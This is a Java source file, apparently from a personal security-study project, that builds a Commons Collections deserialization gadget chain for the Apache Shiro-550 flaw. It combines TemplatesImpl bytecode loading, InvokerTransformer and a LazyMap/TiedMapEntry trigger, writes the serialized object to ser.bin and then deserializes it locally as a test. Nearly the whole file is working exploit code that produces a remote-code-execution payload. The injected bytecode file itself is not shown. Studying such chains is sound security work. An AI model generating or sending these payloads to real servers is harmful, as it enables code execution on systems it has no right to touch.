package shiro;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Shiro550 {
    public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fileNmae);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String []args) throws Exception {
        //CC.CC3
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name", "aaaaa");
        byte[] code = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\ClassLoad\\TemplateCode.class"));
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        //CC.CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        //CC.CC6
        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "valuevalue");
        lazyMap.remove(templates);

        setFieldValue(lazyMap, "factory", invokerTransformer);


        serialize(expMap);
        unserialize("ser.bin");
    }
}